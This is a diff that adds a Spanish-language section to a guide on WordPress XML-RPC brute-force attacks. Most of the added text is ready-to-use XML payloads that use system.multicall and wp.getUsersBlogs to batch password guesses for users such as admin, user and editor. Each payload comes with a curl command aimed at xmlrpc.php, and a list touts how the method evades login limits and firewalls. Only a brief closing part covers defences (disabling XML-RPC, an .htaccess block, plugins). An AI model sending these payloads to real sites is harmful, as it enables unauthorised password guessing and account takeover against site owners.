@@ -352,3 +352,249 @@ Algunos plugins que pueden ayudar a mitigar este ataque:
 📌 **Desactivar o proteger `xmlrpc.php` es esencial para evitar estos ataques.**
 
 🚀 **Si eres un administrador de WordPress, revisa y protege tu sitio AHORA.**
+
+
+
+
+
+
+
+----
+
+
+
+
+
+
+## **Plantillas XML para Ataques de Fuerza Bruta en XML-RPC de WordPress**
+
+Para explotar `xmlrpc.php` en WordPress, podemos enviar solicitudes XML personalizadas con múltiples combinaciones de usuario y contraseña en una sola petición. A continuación, te muestro plantillas XML para ataques de fuerza bruta utilizando `system.multicall`.
+
+---
+
+### **📌 1. Plantilla XML para probar una única combinación de usuario/contraseña**
+
+Esta plantilla envía una solicitud de autenticación estándar a `xmlrpc.php` usando el método `wp.getUsersBlogs`.
+
+```xml
+<?xml version="1.0"?>
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params>
+    <param>
+      <value><string>admin</string></value>
+    </param>
+    <param>
+      <value><string>password123</string></value>
+    </param>
+  </params>
+</methodCall>
+```
+
+📌 **Uso:** Puedes guardarlo en un archivo `single_attempt.xml` y enviarlo con `cURL`:
+
+```bash
+curl -X POST -d @single_attempt.xml https://ejemplo.com/xmlrpc.php
+```
+
+---
+
+### **🚀 2. Plantilla XML con `system.multicall` para múltiples intentos en una sola solicitud**
+
+Esta plantilla permite enviar múltiples combinaciones de usuario y contraseña **en una sola petición HTTP**, acelerando drásticamente el ataque.
+
+```xml
+<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.multicall</methodName>
+  <params>
+    <param>
+      <value>
+        <array>
+          <data>
+            <value>
+              <struct>
+                <member>
+                  <name>methodName</name>
+                  <value><string>wp.getUsersBlogs</string></value>
+                </member>
+                <member>
+                  <name>params</name>
+                  <value>
+                    <array>
+                      <data>
+                        <value>
+                          <array>
+                            <data>
+                              <value><string>admin</string></value>
+                              <value><string>password123</string></value>
+                            </data>
+                          </array>
+                        </value>
+                        <value>
+                          <array>
+                            <data>
+                              <value><string>admin</string></value>
+                              <value><string>admin123</string></value>
+                            </data>
+                          </array>
+                        </value>
+                        <value>
+                          <array>
+                            <data>
+                              <value><string>admin</string></value>
+                              <value><string>qwerty</string></value>
+                            </data>
+                          </array>
+                        </value>
+                      </data>
+                    </array>
+                  </value>
+                </member>
+              </struct>
+            </value>
+          </data>
+        </array>
+      </value>
+    </param>
+  </params>
+</methodCall>
+```
+
+📌 **Explicación:**
+
+- Este XML envía **tres intentos** de autenticación en una sola petición.
+- Se pueden agregar más combinaciones simplemente duplicando las secciones `<value>...</value>` con diferentes usuarios y contraseñas.
+
+📌 **Uso con cURL:**  
+Guárdalo como `brute_force.xml` y ejecútalo con:
+
+```bash
+curl -X POST -d @brute_force.xml https://ejemplo.com/xmlrpc.php
+```
+
+---
+
+### **🔥 3. Plantilla XML para probar múltiples usuarios con múltiples contraseñas**
+
+Si no conoces el usuario exacto, esta plantilla prueba varias combinaciones de usuarios y contraseñas.
+
+```xml
+<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.multicall</methodName>
+  <params>
+    <param>
+      <value>
+        <array>
+          <data>
+            <value>
+              <struct>
+                <member>
+                  <name>methodName</name>
+                  <value><string>wp.getUsersBlogs</string></value>
+                </member>
+                <member>
+                  <name>params</name>
+                  <value>
+                    <array>
+                      <data>
+                        <value>
+                          <array>
+                            <data>
+                              <value><string>admin</string></value>
+                              <value><string>password</string></value>
+                            </data>
+                          </array>
+                        </value>
+                        <value>
+                          <array>
+                            <data>
+                              <value><string>admin</string></value>
+                              <value><string>123456</string></value>
+                            </data>
+                          </array>
+                        </value>
+                        <value>
+                          <array>
+                            <data>
+                              <value><string>user</string></value>
+                              <value><string>user123</string></value>
+                            </data>
+                          </array>
+                        </value>
+                        <value>
+                          <array>
+                            <data>
+                              <value><string>editor</string></value>
+                              <value><string>editorpass</string></value>
+                            </data>
+                          </array>
+                        </value>
+                      </data>
+                    </array>
+                  </value>
+                </member>
+              </struct>
+            </value>
+          </data>
+        </array>
+      </value>
+    </param>
+  </params>
+</methodCall>
+```
+
+📌 **Explicación:**
+
+- Esta plantilla prueba **varios usuarios** (`admin`, `user`, `editor`) con **varias contraseñas** en una sola petición.
+- Se pueden agregar más combinaciones fácilmente.
+
+📌 **Uso:**  
+Guárdalo como `multi_user_brute.xml` y envíalo con:
+
+```bash
+curl -X POST -d @multi_user_brute.xml https://ejemplo.com/xmlrpc.php
+```
+
+---
+
+## **🚀 Ventajas de Usar XML-RPC para Fuerza Bruta**
+
+✅ **Mucho más rápido** que los ataques a `/wp-login.php`.  
+✅ **Evita algunas protecciones básicas** que limitan intentos en el login normal.  
+✅ **Reduce consumo de ancho de banda** (menos peticiones).  
+✅ **Puede pasar desapercibido** en algunos firewalls mal configurados.
+
+---
+
+## **🛡️ Cómo Defenderse de Estos Ataques**
+
+Si eres administrador de WordPress, **debes protegerte contra estos ataques**. Aquí algunas soluciones:
+
+🔴 **Desactivar XML-RPC si no lo necesitas:**
+
+```php
+add_filter('xmlrpc_enabled', '__return_false');
+```
+
+🔴 **Bloquear el acceso a `xmlrpc.php` con `.htaccess`:**
+
+```apache
+<Files xmlrpc.php>
+    Order Deny,Allow
+    Deny from all
+</Files>
+```
+
+🔴 **Usar plugins de seguridad:**
+
+- **Wordfence Security**
+- **Disable XML-RPC**
+- **Limit Login Attempts Reloaded**
+
+---
+
+## **📌 Conclusión**
+
+Los ataques de fuerza bruta con `system.multicall` en XML-RPC **son extremadamente rápidos** y permiten probar cientos de combinaciones en una sola solicitud. **Si administras un WordPress, protege tu sitio YA**. 🚀
